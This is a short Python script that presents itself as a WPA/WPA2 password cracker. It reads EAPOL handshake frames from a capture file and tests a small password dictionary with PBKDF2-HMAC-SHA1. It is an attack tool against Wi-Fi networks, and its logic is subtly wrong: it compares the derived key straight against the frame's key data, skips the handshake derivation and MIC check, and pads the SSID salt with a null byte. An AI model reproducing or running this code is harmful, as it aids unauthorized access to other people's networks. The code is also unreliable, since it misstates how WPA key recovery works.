import hashlib
import hmac
import pyshark
import binascii

# Function to simulate PBKDF2-HMAC-SHA1 (as in WPA/WPA2)
def pbkdf2_hmac_sha1(password, ssid, iterations=4096, dklen=32):
    salt = ssid.encode() + b'\x00'  # Salt is SSID with a null byte as per WPA spec
    return hashlib.pbkdf2_hmac('sha1', password.encode(), salt, iterations, dklen)

# Function to parse the .cap file and extract the EAPOL handshake
def parse_handshake(capture_file):
    cap = pyshark.FileCapture(capture_file, display_filter='eapol')
    eapol_frames = []
    for packet in cap:
        if hasattr(packet, 'eapol'):
            eapol_frames.append(packet)
        if len(eapol_frames) >= 4:  # We need 4 frames for a full 4-way handshake
            break
    return eapol_frames

# Extracts key data from the EAPOL frame
def extract_key_data(eapol_frame):
    # Extract key data from the EAPOL frame
    key_data = eapol_frame.eapol.key_data
    return binascii.unhexlify(key_data)

# Function to simulate cracking the PSK using a dictionary
def crack_psk_from_capture(capture_file, dictionary):
    # Parse the EAPOL frames from the capture
    eapol_frames = parse_handshake(capture_file)

    if len(eapol_frames) < 4:
        print("Insufficient EAPOL frames in capture.")
        return None
    
    # Extract the SSID from the first EAPOL frame (or known value)
    ssid = eapol_frames[0].wlan.ssid  # Ensure your capture has this field available

    # Extract the key data from the last EAPOL frame
    eapol_key_data = extract_key_data(eapol_frames[-1])

    # Loop through dictionary of potential passwords
    for password in dictionary:
        psk_candidate = pbkdf2_hmac_sha1(password, ssid)

        # Compare the derived PSK with the key data from the capture
        if psk_candidate == eapol_key_data:
            print(f"Found PSK: {password}")
            return password

    print("PSK not found in dictionary.")
    return None

# Example usage
capture_file = 'Shak.cap'  # Replace with the path to your .cap file
dictionary = ['password123', 'peklovpn34', 'letmein']

# Try to crack the PSK from the capture file
crack_psk_from_capture(capture_file, dictionary)
